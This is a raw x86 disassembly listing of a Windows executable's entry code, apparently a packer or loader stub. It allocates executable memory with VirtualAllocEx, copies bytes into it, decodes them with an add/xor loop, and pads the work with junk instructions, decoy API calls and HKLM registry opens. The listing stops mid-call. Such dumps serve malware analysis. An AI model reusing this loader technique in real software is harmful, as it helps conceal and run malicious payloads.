0x0041aa70:	pushl	%ebp	; from: 0x0041af92(MAY)
0x0041aa71:	movl	%esp, %ebp
0x0041aa73:	subl	$0xc, %esp
0x0041aa76:	movl	0x8(%ebp), %eax
0x0041aa79:	movl	%eax, -8(%ebp)
0x0041aa7c:	movl	0xc(%ebp), %ecx
0x0041aa7f:	movl	%ecx, -12(%ebp)
0x0041aa82:	movl	$0x22b, -4(%ebp)
0x0041aa89:	movl	-8(%ebp), %edx
0x0041aa8c:	cmpl	-12(%ebp), %edx
0x0041aa8f:	jae	0x0041aa9f	; targets: 0x0041aa91(MAY), 0x0041aa9f(MAY)
0x0041aa91:	movl	$0x22b, -4(%ebp)	; from: 0x0041aa8f(MAY)
0x0041aa98:	movl	-8(%ebp), %eax
0x0041aa9b:	jmp	0x0041aaa9	; targets: 0x0041aaa9(MAY)
0x0041aa9f:	movl	$0x22b, -4(%ebp)	; from: 0x0041aa8f(MAY)
0x0041aaa6:	movl	-12(%ebp), %eax
0x0041aaa9:	movl	%ebp, %esp	; from: 0x0041aa9b(MAY)
0x0041aaab:	popl	%ebp
0x0041aaac:	ret	; targets: 0x0041af97(MAY)

0x0041aab0:	pushl	%ebp	; from: 0x0041af5f(MAY), 0x0041b012(MAY)
0x0041aab1:	movl	%esp, %ebp
0x0041aab3:	subl	$0xc, %esp
0x0041aab6:	movl	$0x1e4dc, -8(%ebp)
0x0041aabd:	movl	$0x3000, -12(%ebp)
0x0041aac4:	movl	$0x40, -4(%ebp)
0x0041aacb:	movl	-4(%ebp), %eax
0x0041aace:	pushl	%eax
0x0041aacf:	movl	-12(%ebp), %ecx
0x0041aad2:	pushl	%ecx
0x0041aad3:	movl	0x8(%ebp), %edx
0x0041aad6:	pushl	%edx
0x0041aad7:	pushl	$0x0
0x0041aad9:	pushl	$0xffffffff
0x0041aadb:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000010(MAY)
0x0041aae1:	movl	%ebp, %esp
0x0041aae3:	popl	%ebp
0x0041aae4:	ret	; targets: 0x0041af64(MAY)

0x0041aaf0:	pushl	%ebp	; from: 0x0041af74(MAY)
0x0041aaf1:	movl	%esp, %ebp
0x0041aaf3:	popl	%ebp
0x0041aaf4:	ret	; targets: 0x0041af79(MAY)

0x0041ab00:	pushl	%ebp	; from: 0x0041ade9(MAY)
0x0041ab01:	movl	%esp, %ebp
0x0041ab03:	movl	$0x402004, 0x004011ec
0x0041ab0d:	popl	%ebp
0x0041ab0e:	ret	; targets: 0x0041adee(MAY)

0x0041ab10:	pushl	%ebp	; from: 0x0041aff7(MAY)
0x0041ab11:	movl	%esp, %ebp
0x0041ab13:	movl	$0x41a820, 0x004011ec
0x0041ab1d:	popl	%ebp
0x0041ab1e:	ret	; targets: 0x0041affc(MAY)

0x0041ab20:	pushl	%ebp	; from: 0x0041b003(MAY), 0x0041af50(MAY)
0x0041ab21:	movl	%esp, %ebp
0x0041ab23:	movl	0x8(%ebp), %eax
0x0041ab26:	movl	-4(%eax), %eax
0x0041ab29:	popl	%ebp
0x0041ab2a:	ret	; targets: 0x0041b008(MAY), 0x0041af55(MAY)

0x0041abd0:	pushl	%ebp	; from: 0x0041afe1(MAY)
0x0041abd1:	movl	%esp, %ebp
0x0041abd3:	subl	$0x30, %esp
0x0041abd6:	movl	$0x11cb, -8(%ebp)
0x0041abdd:	movl	$0x0, -16(%ebp)
0x0041abe4:	jmp	0x0041abef	; targets: 0x0041abef(MAY)
0x0041abef:	movl	-16(%ebp), %ecx	; from: 0x0041abe4(MAY)
0x0041abf2:	cmpl	0xc(%ebp), %ecx
0x0041abf5:	jae	0x0041acb6	; targets: 0x0041abfb(MAY), 0x0041acb6(MAY)
0x0041abfb:	movl	$0x4189, -8(%ebp)	; from: 0x0041abf5(MAY)
0x0041ac02:	cmpl	$0x0, -16(%ebp)
0x0041ac06:	jne	0x0041ac58	; targets: 0x0041ac08(MAY)
0x0041ac08:	pushl	$0x104	; from: 0x0041ac06(MAY)
0x0041ac0d:	pushl	$0x4011f0
0x0041ac12:	call	GetWindowsDirectoryW@kernel32.dll	; targets: 0xff000080(MAY)
0x0041ac18:	pushl	$0x401000
0x0041ac1d:	pushl	$0x4011f0
0x0041ac22:	call	lstrcatW@kernel32.dll	; targets: 0xff000050(MAY)
0x0041ac28:	pushl	$0x0
0x0041ac2a:	pushl	$0x80
0x0041ac2f:	pushl	$0x3
0x0041ac31:	pushl	$0x0
0x0041ac33:	pushl	$0x3
0x0041ac35:	pushl	$0x1
0x0041ac37:	pushl	$0x4011f0
0x0041ac3c:	call	CreateFileW@kernel32.dll	; targets: 0xff000040(MAY)
0x0041ac42:	movl	%eax, -4(%ebp)
0x0041ac45:	cmpl	$0xffffffff, -4(%ebp)
0x0041ac49:	je	0x0041ac51	; targets: 0x0041ac4b(MAY), 0x0041ac51(MAY)
0x0041ac4b:	cmpl	$0x0, -4(%ebp)	; from: 0x0041ac49(MAY)
0x0041ac4f:	jne	0x0041ac58	; targets: 0x0041ac51(MAY), 0x0041ac58(MAY)
0x0041ac51:	movl	$0x42, %eax	; from: 0x0041ac4f(MAY), 0x0041ac49(MAY)
0x0041ac56:	jmp	0x0041acb6	; targets: 0x0041acb6(MAY)
0x0041ac58:	movl	-16(%ebp), %edx	; from: 0x0041ac4f(MAY)
0x0041ac5b:	addl	$0x563, %edx
0x0041ac61:	movl	%edx, -40(%ebp)
0x0041ac64:	movl	-40(%ebp), %eax
0x0041ac67:	movl	%eax, -36(%ebp)
0x0041ac6a:	movl	-36(%ebp), %ecx
0x0041ac6d:	movl	%ecx, -32(%ebp)
0x0041ac70:	movl	-32(%ebp), %edx
0x0041ac73:	movl	%edx, -28(%ebp)
0x0041ac76:	movl	-28(%ebp), %eax
0x0041ac79:	movl	%eax, -48(%ebp)
0x0041ac7c:	movl	-48(%ebp), %ecx
0x0041ac7f:	movl	%ecx, -20(%ebp)
0x0041ac82:	movl	-16(%ebp), %edx
0x0041ac85:	movl	%edx, -24(%ebp)
0x0041ac88:	movl	0x8(%ebp), %eax
0x0041ac8b:	addl	-16(%ebp), %eax
0x0041ac8e:	movl	%eax, -44(%ebp)
0x0041ac91:	movl	-44(%ebp), %ecx
0x0041ac94:	movl	(%ecx), %edx
0x0041ac96:	addl	-24(%ebp), %edx
0x0041ac99:	movl	-44(%ebp), %eax
0x0041ac9c:	movl	%edx, (%eax)
0x0041ac9e:	movl	0x8(%ebp), %ecx
0x0041aca1:	addl	-16(%ebp), %ecx
0x0041aca4:	movl	(%ecx), %edx
0x0041aca6:	xorl	-20(%ebp), %edx
0x0041acb6:	movl	%ebp, %esp	; from: 0x0041ac56(MAY), 0x0041abf5(MAY)
0x0041acb8:	popl	%ebp
0x0041acb9:	ret	; targets: 0x0041afe6(MAY)

0x0041ad20:	pushl	%ebp	; from: 0x0041af45(MAY)
0x0041ad21:	movl	%esp, %ebp
0x0041ad23:	subl	$0x10, %esp
0x0041ad26:	movl	$0x60, -16(%ebp)
0x0041ad2d:	movl	$0x40102c, -4(%ebp)
0x0041ad34:	pushl	$0x1
0x0041ad36:	pushl	$0x1
0x0041ad38:	pushl	$0x1
0x0041ad3a:	pushl	$0x0
0x0041ad3c:	pushl	$0xffffffff
0x0041ad3e:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000010(MAY)
0x0041ad44:	pushl	$0x0
0x0041ad46:	call	GetStockObject@gdi32.dll	; targets: 0xff000030(MAY)
0x0041ad4c:	testl	%eax, %eax
0x0041ad4e:	jne	0x0041ad57	; targets: 0x0041ad50(MAY), 0x0041ad57(MAY)
0x0041ad50:	xorl	%eax, %eax	; from: 0x0041ad4e(MAY)
0x0041ad52:	jmp	0x0041adee	; targets: 0x0041adee(MAY)
0x0041ad57:	movl	$0x42, -16(%ebp)	; from: 0x0041ad4e(MAY)
0x0041ad5e:	movl	RegOpenKeyA@advapi32.dll, %eax
0x0041ad63:	movl	%eax, 0x004012f4
0x0041ad68:	movl	$0x6, -16(%ebp)
0x0041ad6f:	movl	-4(%ebp), %ecx
0x0041ad72:	movb	$0x4f, 0x1(%ecx)
0x0041ad76:	leal	-12(%ebp), %edx
0x0041ad79:	pushl	%edx
0x0041ad7a:	movl	-4(%ebp), %eax
0x0041ad7d:	pushl	%eax
0x0041ad7e:	pushl	$0x80000002
0x0041ad83:	call	0x004012f4	; targets: 0xff000070(MAY)
0x0041ad89:	testl	%eax, %eax
0x0041ad8b:	je	0x0041ad91	; targets: 0x0041ad8d(MAY), 0x0041ad91(MAY)
0x0041ad8d:	xorl	%eax, %eax	; from: 0x0041ad8b(MAY)
0x0041ad8f:	jmp	0x0041adee	; targets: 0x0041adee(MAY)
0x0041ad91:	movl	$0x60, -16(%ebp)	; from: 0x0041ad8b(MAY)
0x0041ad98:	leal	-12(%ebp), %ecx
0x0041ad9b:	pushl	%ecx
0x0041ad9c:	pushl	$0x401038
0x0041ada1:	movl	-12(%ebp), %edx
0x0041ada4:	pushl	%edx
0x0041ada5:	call	0x004012f4	; targets: 0xff000070(MAY)
0x0041adab:	testl	%eax, %eax
0x0041adad:	je	0x0041adb3	; targets: 0x0041adb3(MAY), 0x0041adaf(MAY)
0x0041adaf:	xorl	%eax, %eax	; from: 0x0041adad(MAY)
0x0041adb1:	jmp	0x0041adee	; targets: 0x0041adee(MAY)
0x0041adb3:	leal	-12(%ebp), %eax	; from: 0x0041adad(MAY)
0x0041adb6:	pushl	%eax
0x0041adb7:	pushl	$0x401040
0x0041adbc:	movl	-12(%ebp), %ecx
0x0041adbf:	pushl	%ecx
0x0041adc0:	call	0x004012f4	; targets: 0xff000070(MAY)
0x0041adc6:	testl	%eax, %eax
0x0041adc8:	je	0x0041adce	; targets: 0x0041adca(MAY), 0x0041adce(MAY)
0x0041adca:	xorl	%eax, %eax	; from: 0x0041adc8(MAY)
0x0041adcc:	jmp	0x0041adee	; targets: 0x0041adee(MAY)
0x0041adce:	leal	-12(%ebp), %edx	; from: 0x0041adc8(MAY)
0x0041add1:	pushl	%edx
0x0041add2:	pushl	$0x40107c
0x0041add7:	movl	-12(%ebp), %eax
0x0041adda:	pushl	%eax
0x0041addb:	call	0x004012f4	; targets: 0xff000070(MAY)
0x0041ade1:	testl	%eax, %eax
0x0041ade3:	jne	0x0041ade9	; targets: 0x0041ade5(MAY), 0x0041ade9(MAY)
0x0041ade5:	xorl	%eax, %eax	; from: 0x0041ade3(MAY)
0x0041ade7:	jmp	0x0041adee	; targets: 0x0041adee(MAY)
0x0041ade9:	call	0x0041ab00	; targets: 0x0041ab00(MAY)	; from: 0x0041ade3(MAY)
0x0041adee:	movl	%ebp, %esp	; from: 0x0041ad52(MAY), 0x0041adb1(MAY), 0x0041adcc(MAY), 0x0041ad8f(MAY), 0x0041ab0e(MAY), 0x0041ade7(MAY)
0x0041adf0:	popl	%ebp
0x0041adf1:	ret	$0x10	; targets: 0x0041af4a(MAY)

0x0041ae00:	pushl	%ebp	; from: 0x0041afb1(MAY)
0x0041ae01:	movl	%esp, %ebp
0x0041ae03:	subl	$0x12c, %esp
0x0041ae09:	movl	$0x7c, -288(%ebp)
0x0041ae13:	movl	$0x0, -276(%ebp)
0x0041ae1d:	movl	GetWindowsDirectoryA@kernel32.dll, %eax
0x0041ae22:	movl	%eax, -4(%ebp)
0x0041ae25:	pushl	$0x104
0x0041ae2a:	leal	-272(%ebp), %ecx
0x0041ae30:	pushl	%ecx
0x0041ae31:	call	-4(%ebp)	; targets: 0xff000020(MAY)
0x0041ae34:	movl	lstrcatA@kernel32.dll, %edx
0x0041ae3a:	movl	%edx, -292(%ebp)
0x0041ae40:	movl	CreateFileA@kernel32.dll, %eax
0x0041ae45:	movl	%eax, -280(%ebp)
0x0041ae4b:	movl	$0x0, -296(%ebp)
0x0041ae55:	jmp	0x0041ae66	; targets: 0x0041ae66(MAY)
0x0041ae57:	movl	-296(%ebp), %ecx	; from: 0x0041aea8(MAY)
0x0041ae5d:	addl	$0x1, %ecx
0x0041ae60:	movl	%ecx, -296(%ebp)
0x0041ae66:	movl	-296(%ebp), %edx	; from: 0x0041ae55(MAY)
0x0041ae6c:	cmpl	0x10(%ebp), %edx
0x0041ae6f:	jnl	0x0041aeaa	; targets: 0x0041ae71(MAY), 0x0041aeaa(MAY)
0x0041ae71:	movl	0xc(%ebp), %eax	; from: 0x0041ae6f(MAY)
0x0041ae74:	addl	-296(%ebp), %eax
0x0041ae7a:	movzbl	(%eax), %ecx
0x0041ae7d:	movl	%ecx, -300(%ebp)
0x0041ae83:	movl	$0x7c, -288(%ebp)
0x0041ae8d:	movl	0x8(%ebp), %edx
0x0041ae90:	addl	-296(%ebp), %edx
0x0041ae96:	movb	-300(%ebp), %al
0x0041ae9c:	movb	%al, (%edx)
0x0041ae9e:	movl	$0x33, -288(%ebp)
0x0041aea8:	jmp	0x0041ae57	; targets: 0x0041ae57(MAY)
0x0041aeaa:	movl	%ebp, %esp	; from: 0x0041ae6f(MAY)
0x0041aeac:	popl	%ebp
0x0041aead:	ret	; targets: 0x0041afb6(MAY)


start:
0x0041aeb0:	pushl	%ebp
0x0041aeb1:	movl	%esp, %ebp
0x0041aeb3:	subl	$0x70, %esp
0x0041aeb6:	movl	%ebp, 0x004012f8
0x0041aebc:	pusha	
0x0041aebd:	movl	$0x0, -60(%ebp)
0x0041aec4:	movl	$0x80000002, -80(%ebp)
0x0041aecb:	movl	$0x0, -20(%ebp)
0x0041aed2:	movl	$0x64, -52(%ebp)
0x0041aed9:	movl	$0xf, -28(%ebp)
0x0041aee0:	movl	$0x0, -60(%ebp)
0x0041aee7:	movl	$0x0, -36(%ebp)
0x0041aeee:	movl	$0x1, -48(%ebp)
0x0041aef5:	movl	$0x3, -24(%ebp)
0x0041aefc:	movl	$0x0, -20(%ebp)
0x0041af03:	movl	$0x64, -52(%ebp)
0x0041af0a:	movl	$0xf, -28(%ebp)
0x0041af11:	movl	$0x0, -60(%ebp)
0x0041af18:	movl	$0x0, -36(%ebp)
0x0041af1f:	movl	$0x1, -48(%ebp)
0x0041af26:	movl	$0x3, -24(%ebp)
0x0041af2d:	pushl	$0x104
0x0041af32:	pushl	$0x4011f0
0x0041af37:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000020(MAY)
0x0041af3d:	pushl	$0x37
0x0041af3f:	pushl	$0x37
0x0041af41:	pushl	$0x37
0x0041af43:	pushl	$0x37
0x0041af45:	call	0x0041ad20	; targets: 0x0041ad20(MAY)
0x0041af4a:	movl	0x004011ec, %eax	; from: 0x0041adf1(MAY)
0x0041af4f:	pushl	%eax
0x0041af50:	call	0x0041ab20	; targets: 0x0041ab20(MAY)
0x0041af55:	addl	$0x4, %esp	; from: 0x0041ab2a(MAY)
0x0041af58:	movl	%eax, -64(%ebp)
0x0041af5b:	movl	-64(%ebp), %ecx
0x0041af5e:	pushl	%ecx
0x0041af5f:	call	0x0041aab0	; targets: 0x0041aab0(MAY)
0x0041af64:	addl	$0x4, %esp	; from: 0x0041aae4(MAY)
0x0041af67:	movl	%eax, -56(%ebp)
0x0041af6a:	movl	-64(%ebp), %edx
0x0041af6d:	pushl	%edx
0x0041af6e:	pushl	$0x0
0x0041af70:	movl	-56(%ebp), %eax
0x0041af73:	pushl	%eax
0x0041af74:	call	0x0041aaf0	; targets: 0x0041aaf0(MAY)
0x0041af79:	addl	$0xc, %esp	; from: 0x0041aaf4(MAY)
0x0041af7c:	movl	-64(%ebp), %ecx
0x0041af7f:	movl	%ecx, -72(%ebp)
0x0041af82:	movl	-60(%ebp), %edx	; from: 0x0041afd7(MAY)
0x0041af85:	cmpl	-64(%ebp), %edx
0x0041af88:	jae	0x0041afd9	; targets: 0x0041af8a(MAY), 0x0041afd9(MAY)
0x0041af8a:	movl	-72(%ebp), %eax	; from: 0x0041af88(MAY)
0x0041af8d:	pushl	%eax
0x0041af8e:	movl	-52(%ebp), %ecx
0x0041af91:	pushl	%ecx
0x0041af92:	call	0x0041aa70	; targets: 0x0041aa70(MAY)
0x0041af97:	addl	$0x8, %esp	; from: 0x0041aaac(MAY)
0x0041af9a:	movl	%eax, -76(%ebp)
0x0041af9d:	movl	-76(%ebp), %edx
0x0041afa0:	pushl	%edx
0x0041afa1:	movl	0x004011ec, %eax
0x0041afa6:	addl	-36(%ebp), %eax
0x0041afa9:	pushl	%eax
0x0041afaa:	movl	-56(%ebp), %ecx
0x0041afad:	addl	-60(%ebp), %ecx
0x0041afb0:	pushl	%ecx
0x0041afb1:	call	0x0041ae00	; targets: 0x0041ae00(MAY)
0x0041afb6:	addl	$0xc, %esp	; from: 0x0041aead(MAY)
0x0041afb9:	movl	-28(%ebp), %edx
0x0041afbc:	addl	-52(%ebp), %edx
0x0041afbf:	addl	-36(%ebp), %edx
0x0041afc2:	movl	%edx, -36(%ebp)
0x0041afc5:	movl	-60(%ebp), %eax
0x0041afc8:	addl	-52(%ebp), %eax
0x0041afcb:	movl	%eax, -60(%ebp)
0x0041afce:	movl	-72(%ebp), %ecx
0x0041afd1:	subl	-76(%ebp), %ecx
0x0041afd4:	movl	%ecx, -72(%ebp)
0x0041afd7:	jmp	0x0041af82	; targets: 0x0041af82(MAY)
0x0041afd9:	movl	-64(%ebp), %edx	; from: 0x0041af88(MAY)
0x0041afdc:	pushl	%edx
0x0041afdd:	movl	-56(%ebp), %eax
0x0041afe0:	pushl	%eax
0x0041afe1:	call	0x0041abd0	; targets: 0x0041abd0(MAY)
0x0041afe6:	addl	$0x8, %esp	; from: 0x0041acb9(MAY)
0x0041afe9:	movl	$0x0, -36(%ebp)
0x0041aff0:	movl	$0x0, -96(%ebp)
0x0041aff7:	call	0x0041ab10	; targets: 0x0041ab10(MAY)
0x0041affc:	movl	0x004011ec, %ecx	; from: 0x0041ab1e(MAY)
0x0041b002:	pushl	%ecx
0x0041b003:	call	0x0041ab20	; targets: 0x0041ab20(MAY)
0x0041b008:	addl	$0x4, %esp	; from: 0x0041ab2a(MAY)
0x0041b00b:	movl	%eax, -100(%ebp)
0x0041b00e:	movl	-100(%ebp), %edx
0x0041b011:	pushl	%edx
0x0041b012:	call	0x0041aab0	; targets: 0x0041aab0(MAY)
